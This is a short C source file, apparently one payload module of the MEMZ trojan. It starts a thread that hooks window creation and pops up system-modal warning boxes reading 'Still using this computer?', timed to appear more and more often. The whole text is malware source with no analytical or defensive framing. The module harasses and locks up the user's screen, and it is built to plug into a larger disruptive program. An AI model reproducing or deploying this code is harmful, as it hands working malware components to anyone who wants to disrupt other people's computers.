#include "../MEMZ.h"

DWORD WINAPI messageBoxThread(LPVOID);

PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
	PAYLOADHEAD

	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

	out: return 998.0 / (times / 5.0 + 1) + 13 + (random() % 15);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}